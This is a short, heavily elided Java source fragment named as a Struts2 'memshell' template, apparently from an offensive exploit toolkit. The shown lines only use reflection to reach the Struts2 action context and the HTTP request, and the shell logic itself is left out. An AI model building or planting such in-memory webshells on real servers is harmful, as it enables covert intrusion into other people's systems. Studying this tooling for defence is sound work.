package com.qi4l.JYso.template.memshellStatic.struts2;
...
public class Struts2ActionMS {
    ...
    static {
        try {
            if (thisClass != null) {
                ...
                java.lang.reflect.Method method  = actionContextClass.getDeclaredMethod("getActionInvocation", (Class<?>) null);
    ...
    public String execute() throws Exception {
        ...
        java.lang.reflect.Method getContextMethod   = actionContextClass.getDeclaredMethod("getContext", (Class<?>) null);
        ...
        java.lang.reflect.Method method       = wrapperClass.getDeclaredMethod("getRequest", (Class<?>) null);
        method.setAccessible(true);
